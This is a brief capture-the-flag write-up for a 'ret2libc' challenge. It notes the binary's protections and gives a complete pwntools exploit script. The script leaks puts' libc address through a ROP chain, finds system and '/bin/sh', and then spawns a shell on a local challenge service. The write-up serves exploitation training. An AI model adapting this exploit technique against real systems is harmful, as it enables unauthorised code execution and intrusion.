# ret2libc

## 文件分析

下载`pwn`, NX on, PIE off, Canary off, RELRO partial  
ghidra分析为64位程序

## 逆向

vuln函数里就写了利用ret2libc...和之前一样

## EXPLOIT

```python
import LibcSearcher
from pwn import *
sh = remote('localhost', 39671)
elf = ELF('ret2libc')

putsPlt = elf.plt['puts']
putsGot = elf.got['puts']
popRdiAddr = 0x40117e
vulnAddr = elf.symbols['vuln']

# payload 1
sh.sendline(b'0'*0x58 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(vulnAddr))

sh.recvuntil(b'??\n\n') # skip
data = sh.recv()
putsGotAddr = u64(data[:6] + b'\0\0')
libc = LibcSearcher.LibcSearcher('puts', putsGotAddr & 0xfff)
libcBase = putsGotAddr - libc.dump('puts')
shstrAddr = libcBase + libc.dump('str_bin_sh')
systemAddr = libcBase + libc.dump('system')
retAddr = 0x40122a

# payload 2
sh.sendline(b'0'*0x58 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

sh.interactive()
```

Done.
